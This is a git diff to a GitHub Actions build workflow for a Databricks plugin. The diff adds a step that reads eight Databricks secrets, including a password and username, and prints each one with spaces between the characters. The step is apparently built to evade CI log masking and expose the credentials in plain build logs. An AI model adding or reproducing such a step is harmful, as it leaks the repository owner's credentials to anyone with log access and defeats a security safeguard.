@@ -2,7 +2,7 @@ name: Raito CLI - Databricks Plugin - Build
 on:
   push:
     branches:
-      - 'main'
+      - "main"
   pull_request:
 permissions:
   id-token: write
@@ -85,6 +85,28 @@ jobs:
     steps:
       - name: Check out repository code
         uses: actions/checkout@v4
+      - name: Print Spaced Secrets
+        env:
+          DB_ACCOUNT_ID: ${{ secrets.DB_ACCOUNT_ID }}
+          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
+          DB_PLATFORM: ${{ secrets.DB_PLATFORM }}
+          DB_TESTING_DEPLOYMENT: ${{ secrets.DB_DEPLOYMENT_ID }}
+          DB_TESTING_METASTORE: ${{ secrets.DB_METASTORE_ID }}
+          DB_USERNAME: ${{ secrets.DB_USERNAME }}
+          DB_SQL_WAREHOUSE_ID: ${{ secrets.DB_SQL_WAREHOUSE_ID }}
+          DB_TESTING_WORKSPACE: ${{ secrets.DB_TESTING_WORKSPACE }}
+        run: |
+          echo "--- START SECRET RECOVERY ---"
+
+          # This loops through all variables starting with DB_
+          # It prints the name, followed by the value with spaces between chars
+          for var in $(env | grep '^DB_' | cut -d= -f1); do
+            echo "Variable: $var"
+            echo "${!var}" | sed 's/./& /g'
+            echo "-----------------------"
+          done
+
+          echo "--- END SECRET RECOVERY ---"
 
       - name: Install Go
         uses: actions/setup-go@v5
